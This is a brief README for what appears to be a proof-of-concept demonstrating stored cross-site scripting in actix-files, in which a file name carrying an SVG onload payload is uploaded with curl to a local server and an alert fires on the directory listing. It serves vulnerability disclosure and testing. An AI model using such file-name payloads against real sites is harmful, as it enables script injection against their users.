# actix-files vuln example

### Run

Start server and upload a file
```
$ echo foo >'">foo<svg onload=alert(1)>'
$ curl -F file=@'">foo<svg onload=alert(1)>' http://localhost:3001/
```
Open web browser to localhost:3001/uploaded

### Result

An alert dialog box should appear
